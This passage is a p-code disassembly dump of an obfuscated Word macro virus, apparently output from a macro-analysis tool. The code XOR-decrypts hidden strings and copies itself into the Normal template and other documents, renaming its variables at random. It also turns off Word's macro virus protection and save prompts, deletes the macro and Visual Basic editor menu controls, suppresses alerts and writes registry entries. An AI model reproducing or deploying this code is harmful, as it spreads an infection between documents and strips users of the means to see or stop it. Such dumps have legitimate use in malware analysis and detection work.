' Line #398:
' 	LitStr 0x0043 "T0G9Jb = Left(T0G9Jb, M16G5E - &O1) & MF0wi & Mid(T0G9Jb, JXVd3djG)"
' 	LitDI2 0x0008 
' 	ArgsSt Modul11 0x0001 
' Line #399:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x0009 
' 	ArgsSt Modul11 0x0001 
' Line #400:
' 	LitStr 0x0004 "Loop"
' 	LitDI2 0x000A 
' 	ArgsSt Modul11 0x0001 
' Line #401:
' 	LitStr 0x000B "GoTo M6K4f0"
' 	LitDI2 0x000B 
' 	ArgsSt Modul11 0x0001 
' Line #402:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x000C 
' 	ArgsSt Modul11 0x0001 
' Line #403:
' 	LitStr 0x0007 "M6K4f0:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul12 0x0001 
' Line #404:
' 	LitStr 0x000E "JXVd3djG = &O1"
' 	LitDI2 0x0001 
' 	ArgsSt Modul12 0x0001 
' Line #405:
' 	LitStr 0x0017 "Do While JXVd3djG > &O0"
' 	LitDI2 0x0002 
' 	ArgsSt Modul12 0x0001 
' Line #406:
' 	LitStr 0x004C "M16G5E = InStr(JXVd3djG + &O3, T0G9Jb, Chr(&O104) & Chr(&O151) & Chr(&O155))"
' 	LitDI2 0x0003 
' 	ArgsSt Modul12 0x0001 
' Line #407:
' 	LitStr 0x0066 "If M16G5E > &O0 Then JXVd3djG = InStr(M16G5E + &O3, T0G9Jb, Chr(&O101) & Chr(&O163)) Else JXVd3djG = 0"
' 	LitDI2 0x0004 
' 	ArgsSt Modul12 0x0001 
' Line #408:
' 	LitStr 0x0016 "If JXVd3djG > &O0 Then"
' 	LitDI2 0x0005 
' 	ArgsSt Modul12 0x0001 
' Line #409:
' 	LitStr 0x0044 "X01TEQM = Trim(Mid(T0G9Jb, M16G5E + &O3, (JXVd3djG - M16G5E) - &O3))"
' 	LitDI2 0x0006 
' 	ArgsSt Modul12 0x0001 
' Line #410:
' 	LitStr 0x0036 "If InStr(X01TEQM, Chr(&O50)) = &O0 Then GoSub Iml96v3i"
' 	LitDI2 0x0007 
' 	ArgsSt Modul12 0x0001 
' Line #411:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x0008 
' 	ArgsSt Modul12 0x0001 
' Line #412:
' 	LitStr 0x0004 "Loop"
' 	LitDI2 0x0009 
' 	ArgsSt Modul12 0x0001 
' Line #413:
' 	LitStr 0x000D "GoTo VK8fm7H2"
' 	LitDI2 0x000A 
' 	ArgsSt Modul12 0x0001 
' Line #414:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x000B 
' 	ArgsSt Modul12 0x0001 
' Line #415:
' 	LitStr 0x0009 "VK8fm7H2:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul13 0x0001 
' Line #416:
' 	LitStr 0x001C "JXVd3djG = &O1: M16G5E = &O1"
' 	LitDI2 0x0001 
' 	ArgsSt Modul13 0x0001 
' Line #417:
' 	LitStr 0x0017 "Do While JXVd3djG > &O0"
' 	LitDI2 0x0002 
' 	ArgsSt Modul13 0x0001 
' Line #418:
' 	LitStr 0x0032 "JXVd3djG = InStr(M16G5E, T0G9Jb, Chr(&O72) & vbCr)"
' 	LitDI2 0x0003 
' 	ArgsSt Modul13 0x0001 
' Line #419:
' 	LitStr 0x001B "If JXVd3djG - 20 > &O0 Then"
' 	LitDI2 0x0004 
' 	ArgsSt Modul13 0x0001 
' Line #420:
' 	LitStr 0x0024 "M16G5E = JXVd3djG - 20: AM4if6 = &O0"
' 	LitDI2 0x0005 
' 	ArgsSt Modul13 0x0001 
' Line #421:
' 	LitStr 0x008C "Do: M16G5E = M16G5E + AM4if6: AM4if6 = InStr(&O1, Trim(Mid(T0G9Jb, M16G5E + &O1, (JXVd3djG - M16G5E) - &O1)), vbCr): Loop Until AM4if6 = &O0"
' 	LitDI2 0x0006 
' 	ArgsSt Modul13 0x0001 
' Line #422:
' 	LitStr 0x0015 "M16G5E = M16G5E + &O1"
' 	LitDI2 0x0007 
' 	ArgsSt Modul13 0x0001 
' Line #423:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x0008 
' 	ArgsSt Modul13 0x0001 
' Line #424:
' 	LitStr 0x001F "If JXVd3djG - M16G5E > &O0 Then"
' 	LitDI2 0x0009 
' 	ArgsSt Modul13 0x0001 
' Line #425:
' 	LitStr 0x0046 "X01TEQM = Trim(Mid(T0G9Jb, M16G5E, JXVd3djG - M16G5E)): GoSub Iml96v3i"
' 	LitDI2 0x000A 
' 	ArgsSt Modul13 0x0001 
' Line #426:
' 	LitStr 0x000D "Else: Exit Do"
' 	LitDI2 0x000B 
' 	ArgsSt Modul13 0x0001 
' Line #427:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x000C 
' 	ArgsSt Modul13 0x0001 
' Line #428:
' 	LitStr 0x0036 "M16G5E = InStr(M16G5E, T0G9Jb, Chr(&O72) & vbCr) + &O2"
' 	LitDI2 0x000D 
' 	ArgsSt Modul13 0x0001 
' Line #429:
' 	LitStr 0x0004 "Loop"
' 	LitDI2 0x000E 
' 	ArgsSt Modul13 0x0001 
' Line #430:
' 	LitStr 0x000A "GoTo G8b3E"
' 	LitDI2 0x000F 
' 	ArgsSt Modul13 0x0001 
' Line #431:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x0010 
' 	ArgsSt Modul13 0x0001 
' Line #432:
' 	LitStr 0x0006 "G8b3E:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul14 0x0001 
' Line #433:
' 	LitStr 0x000E "ReDim Pn56mO3("
' 	LitDI2 0x0001 
' 	ArgsSt Modul14 0x0001 
' Line #434:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x000E "œç�¾†ÅÄÉÖÎ°¬ìñ"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0026 ": GoSub VXdgkhe6: Pn56mO3(&O0) = MF0wi"
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsSt Modul14 0x0001 
' Line #435:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x000E "œç�¾„ÃÎÒóÁ’ úû"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0026 ": GoSub VXdgkhe6: Pn56mO3(&O1) = MF0wi"
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsSt Modul14 0x0001 
' Line #436:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0011 "œç�¾–ÅÍÛÔéž³äõ¾ÿÞ"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0026 ": GoSub VXdgkhe6: Pn56mO3(&O2) = MF0wi"
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsSt Modul14 0x0001 
' Line #437:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0010 "œç�¾„ÃÎÒóÃƒ·áû¤é"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0026 ": GoSub VXdgkhe6: Pn56mO3(&O3) = MF0wi"
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsSt Modul14 0x0001 
' Line #438:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0007 "Ÿà†è±ØÄ"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0032 ": GoSub VXdgkhe6: Pn56mO3(&O4) = MF0wi & Chr(&O40)"
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsSt Modul14 0x0001 
' Line #439:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0007 "Šü‹¾ƒÙÃ"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0026 ": GoSub VXdgkhe6: Pn56mO3(&O5) = MF0wi"
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsSt Modul14 0x0001 
' Line #440:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0008 
' 	ArgsSt Modul14 0x0001 
' Line #441:
' 	LitStr 0x000C "GoTo S7M988u"
' 	LitDI2 0x0009 
' 	ArgsSt Modul14 0x0001 
' Line #442:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x000A 
' 	ArgsSt Modul14 0x0001 
' Line #443:
' 	LitStr 0x0008 "S7M988u:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul15 0x0001 
' Line #444:
' 	LitStr 0x0015 "Dim DBWmd8T As Object"
' 	LitDI2 0x0001 
' 	ArgsSt Modul15 0x0001 
' Line #445:
' 	LitStr 0x0037 "For AM4if6 = &O1 To CVS3lq.VBProject.VBComponents.Count"
' 	LitDI2 0x0002 
' 	ArgsSt Modul15 0x0001 
' Line #446:
' 	LitStr 0x003E "Set DBWmd8T = CVS3lq.VBProject.VBComponents(AM4if6).CodeModule"
' 	LitDI2 0x0003 
' 	ArgsSt Modul15 0x0001 
' Line #447:
' 	LitStr 0x000C "With DBWmd8T"
' 	LitDI2 0x0004 
' 	ArgsSt Modul15 0x0001 
' Line #448:
' 	LitStr 0x0017 "For PdwD8a = &O0 To &O3"
' 	LitDI2 0x0005 
' 	ArgsSt Modul15 0x0001 
' Line #449:
' 	LitStr 0x000C "M16G5E = &O0"
' 	LitDI2 0x0006 
' 	ArgsSt Modul15 0x0001 
' Line #450:
' 	LitStr 0x0052 "If .Find(Pn56mO3(PdwD8a), M16G5E, &O1, .CountOfLines, 1, False, False, False) Then"
' 	LitDI2 0x0007 
' 	ArgsSt Modul15 0x0001 
' Line #451:
' 	LitStr 0x0024 "For Uo5hL7 = M16G5E To .CountOfLines"
' 	LitDI2 0x0008 
' 	ArgsSt Modul15 0x0001 
' Line #452:
' 	LitStr 0x0022 "LS2m39 = Trim(.Lines(Uo5hL7, &O1))"
' 	LitDI2 0x0009 
' 	ArgsSt Modul15 0x0001 
' Line #453:
' 	LitStr 0x002A ".DeleteLines Uo5hL7: Uo5hL7 = Uo5hL7 - &O1"
' 	LitDI2 0x000A 
' 	ArgsSt Modul15 0x0001 
' Line #454:
' 	LitStr 0x0026 "If LS2m39 = Pn56mO3(&O5) Then Exit For"
' 	LitDI2 0x000B 
' 	ArgsSt Modul15 0x0001 
' Line #455:
' 	LitStr 0x000B "Next Uo5hL7"
' 	LitDI2 0x000C 
' 	ArgsSt Modul15 0x0001 
' Line #456:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x000D 
' 	ArgsSt Modul15 0x0001 
' Line #457:
' 	LitStr 0x000B "Next PdwD8a"
' 	LitDI2 0x000E 
' 	ArgsSt Modul15 0x0001 
' Line #458:
' 	LitStr 0x0008 "End With"
' 	LitDI2 0x000F 
' 	ArgsSt Modul15 0x0001 
' Line #459:
' 	LitStr 0x000B "Next AM4if6"
' 	LitDI2 0x0010 
' 	ArgsSt Modul15 0x0001 
' Line #460:
' 	LitStr 0x000A "GoTo O192b"
' 	LitDI2 0x0011 
' 	ArgsSt Modul15 0x0001 
' Line #461:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x0012 
' 	ArgsSt Modul15 0x0001 
' Line #462:
' 	LitStr 0x0006 "O192b:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul16 0x0001 
' Line #463:
' 	LitStr 0x000C "With PcDCm9n"
' 	LitDI2 0x0001 
' 	ArgsSt Modul16 0x0001 
' Line #464:
' 	LitStr 0x001C "GoSub R0Lsd: LS2m39 = RRPU1a"
' 	LitDI2 0x0002 
' 	ArgsSt Modul16 0x0001 
' Line #465:
' 	LitStr 0x0023 "For AM4if6 = &O6 To UBound(Pn56mO3)"
' 	LitDI2 0x0003 
' 	ArgsSt Modul16 0x0001 
' Line #466:
' 	LitStr 0x000C "M16G5E = &O0"
' 	LitDI2 0x0004 
' 	ArgsSt Modul16 0x0001 
' Line #467:
' 	LitStr 0x0052 "If .Find(Pn56mO3(AM4if6), M16G5E, &O1, .CountOfLines, 1, False, False, False) Then"
' 	LitDI2 0x0005 
' 	ArgsSt Modul16 0x0001 
' Line #468:
' 	LitStr 0x0035 "HB112LY = M16G5E + &O1: QEW3NE = LS2m39: GoSub J54Jq0"
' 	LitDI2 0x0006 
' 	ArgsSt Modul16 0x0001 
' Line #469:
' 	LitStr 0x0004 "Else"
' 	LitDI2 0x0007 
' 	ArgsSt Modul16 0x0001 
' Line #470:
' 	LitStr 0x007A "HB112LY = .CountOfLines + &O1: QEW3NE = Pn56mO3(&O4) & Pn56mO3(AM4if6) & vbCr & LS2m39 & vbCr & Pn56mO3(&O5): GoSub J54Jq0"
' 	LitDI2 0x0008 
' 	ArgsSt Modul16 0x0001 
' Line #471:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x0009 
' 	ArgsSt Modul16 0x0001 
' Line #472:
' 	LitStr 0x000B "Next AM4if6"
' 	LitDI2 0x000A 
' 	ArgsSt Modul16 0x0001 
' Line #473:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0003 "œç�"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x003A ": GoSub VXdgkhe6: LS2m39 = MF0wi & Chr(&O40): M16G5E = &O0"
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsSt Modul16 0x0001 
' Line #474:
' 	LitStr 0x006D "If .Find(LS2m39, M16G5E, &O1, .CountOfLines, 1, False, False, False) Then HB112LY = M16G5E Else HB112LY = &O1"
' 	LitDI2 0x000C 
' 	ArgsSt Modul16 0x0001 
' Line #475:
' 	LitStr 0x005B "QEW3NE = Pn56mO3(&O4) & LS2m39 & RRPU1a & vbCr & T0G9Jb & Pn56mO3(&O5) & vbCr: GoSub J54Jq0"
' 	LitDI2 0x000D 
' 	ArgsSt Modul16 0x0001 
' Line #476:
' 	LitStr 0x0008 "End With"
' 	LitDI2 0x000E 
' 	ArgsSt Modul16 0x0001 
' Line #477:
' 	LitStr 0x000B "GoTo E1QdMs"
' 	LitDI2 0x000F 
' 	ArgsSt Modul16 0x0001 
' Line #478:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x0010 
' 	ArgsSt Modul16 0x0001 
' Line #479:
' 	LitStr 0x0007 "E1QdMs:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul17 0x0001 
' Line #480:
' 	LitStr 0x001F "If CVS3lq = NormalTemplate Then"
' 	LitDI2 0x0001 
' 	ArgsSt Modul17 0x0001 
' Line #481:
' 	LitStr 0x003F "Set PcDCm9n = CVS3lq.VBProject.VBComponents.Add(&O1).CodeModule"
' 	LitDI2 0x0002 
' 	ArgsSt Modul17 0x0001 
' Line #482:
' 	LitStr 0x0033 "HB112LY = PcDCm9n.CountOfLines + &O1: QEW3NE = vbCr"
' 	LitDI2 0x0003 
' 	ArgsSt Modul17 0x0001 
' Line #483:
' 	LitStr 0x0072 "For AM4if6 = &O0 To &O3: QEW3NE = QEW3NE & Pn56mO3(AM4if6) & vbCr & Pn56mO3(&O5) & vbCr: Next AM4if6: GoSub J54Jq0"
' 	LitDI2 0x0004 
' 	ArgsSt Modul17 0x0001 
' Line #484:
' 	LitStr 0x0013 "NormalTemplate.Save"
' 	LitDI2 0x0005 
' 	ArgsSt Modul17 0x0001 
' Line #485:
' 	LitStr 0x0039 "ElseIf ActiveDocument.Path <> "" Then ActiveDocument.Save"
' 	LitDI2 0x0006 
' 	ArgsSt Modul17 0x0001 
' Line #486:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x0007 
' 	ArgsSt Modul17 0x0001 
' Line #487:
' 	LitStr 0x000D "GoSub Xg645Ye"
' 	LitDI2 0x0008 
' 	ArgsSt Modul17 0x0001 
' Line #488:
' 	LitStr 0x000C "GoTo DcJ7WD5"
' 	LitDI2 0x0009 
' 	ArgsSt Modul17 0x0001 
' Line #489:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x000A 
' 	ArgsSt Modul17 0x0001 
' Line #490:
' 	LitStr 0x0008 "Xg645Ye:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul18 0x0001 
' Line #491:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0009 "‚àÁ¾ƒÜÎÝë"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x008A ": GoSub VXdgkhe6: LS2m39 = MF0wi & Chr(&O40) & SwMgP44(&O0) & Chr(&O56) & SwMgP44(&O1) & Chr(&O56) & SwMgP44(&O2) & Chr(&O40) & Chr(&O102)"
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsSt Modul18 0x0001 
' Line #492:
' 	LitStr 0x0044 "System.PrivateProfileString("", YhXdXf7(&O0), YhXdXf7(&O2)) = LS2m39"
' 	LitDI2 0x0002 
' 	ArgsSt Modul18 0x0001 
' Line #493:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0009 "ŒýŸç¢ÅÆÖô"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0020 ": GoSub VXdgkhe6: LS2m39 = MF0wi"
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsSt Modul18 0x0001 
' Line #494:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x001E "ý¢ß®ðÿÑÑãçÞ•ýø¡ûÃ¹ó„ÄÐ­ÁÜƒÂèì¡"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x004E ": GoSub VXdgkhe6: LS2m39 = LS2m39 & Chr(&O40) & Chr(&O251) & Chr(&O40) & MF0wi"
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsSt Modul18 0x0001 
' Line #495:
' 	LitStr 0x0044 "System.PrivateProfileString("", YhXdXf7(&O0), YhXdXf7(&O3)) = LS2m39"
' 	LitDI2 0x0005 
' 	ArgsSt Modul18 0x0001 
' Line #496:
' 	LitStr 0x0006 "Return"
' 	LitDI2 0x0006 
' 	ArgsSt Modul18 0x0001 
' Line #497:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x0007 
' 	ArgsSt Modul18 0x0001 
' Line #498:
' 	LitStr 0x0009 "VXdgkhe6:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul19 0x0001 
' Line #499:
' 	LitStr 0x001F "For XMh9n6h = &O1 To Len(MF0wi)"
' 	LitDI2 0x0001 
' 	ArgsSt Modul19 0x0001 
' Line #500:
' 	LitStr 0x0061 "Mid(MF0wi, XMh9n6h, &O1) = Chr(Asc(Mid(MF0wi, XMh9n6h, &O1)) Xor Asc(Mid(Fp5Gc6n, XMh9n6h, &O1)))"
' 	LitDI2 0x0002 
' 	ArgsSt Modul19 0x0001 
' Line #501:
' 	LitStr 0x000C "Next XMh9n6h"
' 	LitDI2 0x0003 
' 	ArgsSt Modul19 0x0001 
' Line #502:
' 	LitStr 0x0006 "Return"
' 	LitDI2 0x0004 
' 	ArgsSt Modul19 0x0001 
' Line #503:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x0005 
' 	ArgsSt Modul19 0x0001 
' Line #504:
' 	LitStr 0x0009 "NwR7Xamt:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul20 0x0001 
' Line #505:
' 	LitStr 0x001F "For XMh9n6h = &O1 To Len(MF0wi)"
' 	LitDI2 0x0001 
' 	ArgsSt Modul20 0x0001 
' Line #506:
' 	LitStr 0x0090 "Mid(MF0wi, XMh9n6h, &O1) = Chr(Asc(Chr(Asc(Mid(MF0wi, XMh9n6h, &O1)) Xor Asc(Mid(Fp5Gc6n, XMh9n6h, &O1)))) Xor Asc(Mid(GflIa73P, XMh9n6h, &O1)))"
' 	LitDI2 0x0002 
' 	ArgsSt Modul20 0x0001 
' Line #507:
' 	LitStr 0x000C "Next XMh9n6h"
' 	LitDI2 0x0003 
' 	ArgsSt Modul20 0x0001 
' Line #508:
' 	LitStr 0x0006 "Return"
' 	LitDI2 0x0004 
' 	ArgsSt Modul20 0x0001 
' Line #509:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x0005 
' 	ArgsSt Modul20 0x0001 
' Line #510:
' 	LitStr 0x0006 "R0Lsd:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul21 0x0001 
' Line #511:
' 	LitStr 0x0025 "RRPU1a = Chr(Int(Rnd * &O31) + &O101)"
' 	LitDI2 0x0001 
' 	ArgsSt Modul21 0x0001 
' Line #512:
' 	LitStr 0x0029 "For XMh9n6h = &O1 To Int(Rnd * &O4) + &O4"
' 	LitDI2 0x0002 
' 	ArgsSt Modul21 0x0001 
' Line #513:
' 	LitStr 0x0022 "Select Case Int((Rnd * &O3) + &O1)"
' 	LitDI2 0x0003 
' 	ArgsSt Modul21 0x0001 
' Line #514:
' 	LitStr 0x0038 "Case &O1: RRPU1a = RRPU1a & Chr(Int(Rnd * &O31) + &O101)"
' 	LitDI2 0x0004 
' 	ArgsSt Modul21 0x0001 
' Line #515:
' 	LitStr 0x0037 "Case &O2: RRPU1a = RRPU1a & Chr(Int(Rnd * &O12) + &O60)"
' 	LitDI2 0x0005 
' 	ArgsSt Modul21 0x0001 
' Line #516:
' 	LitStr 0x0038 "Case &O3: RRPU1a = RRPU1a & Chr(Int(Rnd * &O31) + &O141)"
' 	LitDI2 0x0006 
' 	ArgsSt Modul21 0x0001 
' Line #517:
' 	LitStr 0x000A "End Select"
' 	LitDI2 0x0007 
' 	ArgsSt Modul21 0x0001 
' Line #518:
' 	LitStr 0x0042 "Next XMh9n6h: If InStr(&O1, T0G9Jb, RRPU1a) <> &O0 Then GoTo R0Lsd"
' 	LitDI2 0x0008 
' 	ArgsSt Modul21 0x0001 
' Line #519:
' 	LitStr 0x0006 "Return"
' 	LitDI2 0x0009 
' 	ArgsSt Modul21 0x0001 
' Line #520:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x000A 
' 	ArgsSt Modul21 0x0001 
' Line #521:
' 	LitStr 0x0009 "Iml96v3i:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul22 0x0001 
' Line #522:
' 	LitStr 0x000B "GoSub R0Lsd"
' 	LitDI2 0x0001 
' 	ArgsSt Modul22 0x0001 
' Line #523:
' 	LitStr 0x001A "AM4if6 = &O0 - Len(RRPU1a)"
' 	LitDI2 0x0002 
' 	ArgsSt Modul22 0x0001 
' Line #524:
' 	LitStr 0x0016 "Do While AM4if6 <> &O0"
' 	LitDI2 0x0003 
' 	ArgsSt Modul22 0x0001 
' Line #525:
' 	LitStr 0x003B "AM4if6 = InStr(AM4if6 + Len(RRPU1a) + &O1, T0G9Jb, X01TEQM)"
' 	LitDI2 0x0004 
' 	ArgsSt Modul22 0x0001 
' Line #526:
' 	LitStr 0x0080 "If AM4if6 > &O0 Then T0G9Jb = Left(T0G9Jb, AM4if6 - &O1) & RRPU1a & Right(T0G9Jb, (Len(T0G9Jb) - (AM4if6 + Len(X01TEQM)) + &O1))"
' 	LitDI2 0x0005 
' 	ArgsSt Modul22 0x0001 
' Line #527:
' 	LitStr 0x0004 "Loop"
' 	LitDI2 0x0006 
' 	ArgsSt Modul22 0x0001 
' Line #528:
' 	LitStr 0x0006 "Return"
' 	LitDI2 0x0007 
' 	ArgsSt Modul22 0x0001 
' Line #529:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x0008 
' 	ArgsSt Modul22 0x0001 
' Line #530:
' 	LitStr 0x0009 "VvhD15Ok:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul23 0x0001 
' Line #531:
' 	LitStr 0x0014 "On Error Resume Next"
' 	LitDI2 0x0001 
' 	ArgsSt Modul23 0x0001 
' Line #532:
' 	LitStr 0x0017 "Dim YBx34exD As Variant"
' 	LitDI2 0x0002 
' 	ArgsSt Modul23 0x0001 
' Line #533:
' 	LitStr 0x0041 "YBx34exD = Array(&O72501, &O1357, &O1435, &O1012, &O520, &O72535)"
' 	LitDI2 0x0003 
' 	ArgsSt Modul23 0x0001 
' Line #534:
' 	LitStr 0x000C "With Options"
' 	LitDI2 0x0004 
' 	ArgsSt Modul23 0x0001 
' Line #535:
' 	LitStr 0x0080 ".VirusProtection = (&O1 - &O1): .SaveNormalPrompt = (&O1 - &O1): .ConfirmConversions = (&O1 - &O1): .AllowFastSave = (&O1 - &O1)"
' 	LitDI2 0x0005 
' 	ArgsSt Modul23 0x0001 
' Line #536:
' 	LitStr 0x0074 ".BackgroundSave = (&O1 - &O1): .CreateBackup = (&O1 - &O1): .SavePropertiesPrompt = (&O1 - &O1): .SaveInterval = &O0"
' 	LitDI2 0x0006 
' 	ArgsSt Modul23 0x0001 
' Line #537:
' 	LitStr 0x0008 "End With"
' 	LitDI2 0x0007 
' 	ArgsSt Modul23 0x0001 
' Line #538:
' 	LitStr 0x009B "For AM4if6 = &O0 To &O5: Set U4l6O6NO = Application.CommandBars.FindControl(ID:=YBx34exD(AM4if6)): U4l6O6NO.Enabled = (1 - 1): U4l6O6NO.Delete: Next AM4if6"
' 	LitDI2 0x0008 
' 	ArgsSt Modul23 0x0001 
' Line #539:
' 	LitStr 0x0020 "With Application.VBE.CommandBars"
' 	LitDI2 0x0009 
' 	ArgsSt Modul23 0x0001 
' Line #540:
' 	LitStr 0x0058 "Set U4l6O6NO = .FindControl(ID:=&O1642): U4l6O6NO.Enabled = (&O1 - &O1): U4l6O6NO.Delete"
' 	LitDI2 0x000A 
' 	ArgsSt Modul23 0x0001 
' Line #541:
' 	LitStr 0x0058 "Set U4l6O6NO = .FindControl(ID:=&O1012): U4l6O6NO.Enabled = (&O1 - &O1): U4l6O6NO.Delete"
' 	LitDI2 0x000B 
' 	ArgsSt Modul23 0x0001 
' Line #542:
' 	LitStr 0x0008 "End With"
' 	LitDI2 0x000C 
' 	ArgsSt Modul23 0x0001 
' Line #543:
' 	LitStr 0x0010 "With Application"
' 	LitDI2 0x000D 
' 	ArgsSt Modul23 0x0001 
' Line #544:
' 	LitStr 0x0087 ".ScreenUpdating = (&O1 - &O1): .ShowVisualBasicEditor = (&O1 - &O1): .EnableCancelKey = wdCancelDisabled: .DisplayAlerts = wdAlertsNone"
' 	LitDI2 0x000E 
' 	ArgsSt Modul23 0x0001 
' Line #545:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x000C "™ûœë±À�üáÿš "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0066 ": GoSub VXdgkhe6: .CommandBars(MF0wi).Enabled = (&O1 - &O1): .CommandBars(MF0wi).Visible = (&O1 - &O1)"
' 	Concat 
' 	LitDI2 0x000F 
' 	ArgsSt Modul23 0x0001 
' Line #546:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0005 "›ý€ò£"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x003F ": GoSub VXdgkhe6: .VBE.CommandBars(MF0wi).Enabled = (&O1 - &O1)"
' 	Concat 
' 	LitDI2 0x0010 
' 	ArgsSt Modul23 0x0001 
' Line #547:
' 	LitStr 0x0008 "End With"
' 	LitDI2 0x0011 
' 	ArgsSt Modul23 0x0001 
' Line #548:
' 	LitStr 0x000B "With System"
' 	LitDI2 0x0012 
' 	ArgsSt Modul23 0x0001 
' Line #549:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x002F "‡ÙªÇ�ïôìÒÉ½—×Á™ßÿÅã„ÐÔµÒÏ’÷Êëì£üæ�÷ÐÚË¯¾”ËçÞ©î—"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0020 ": GoSub VXdgkhe6: LS2m39 = MF0wi"
' 	Concat 
' 	LitDI2 0x0013 
' 	ArgsSt Modul23 0x0001 
' Line #550:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x001F "þ²Þ¾áŒ�ž±¬Âã¹´ûºœ¹�Ë‡€ó“Œ×š§³¯à"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0022 ": GoSub VXdgkhe6: GL3N32Ng = MF0wi"
' 	Concat 
' 	LitDI2 0x0014 
' 	ArgsSt Modul23 0x0001 
' Line #551:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x000E "Œý‹û’ÍÂÕÃãŸ¬úç"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0045 ": GoSub VXdgkhe6: .PrivateProfileString("", LS2m39, MF0wi) = GL3N32Ng"
' 	Concat 
' 	LitDI2 0x0015 
' 	ArgsSt Modul23 0x0001 
' Line #552:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x000E "Œý‹û–ÃÓÛÃãŸ¬úç"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0045 ": GoSub VXdgkhe6: .PrivateProfileString("", LS2m39, MF0wi) = GL3N32Ng"
' 	Concat 
' 	LitDI2 0x0016 
' 	ArgsSt Modul23 0x0001 
' Line #553:
' 	LitStr 0x0008 "End With"
' 	LitDI2 0x0017 
' 	ArgsSt Modul23 0x0001 
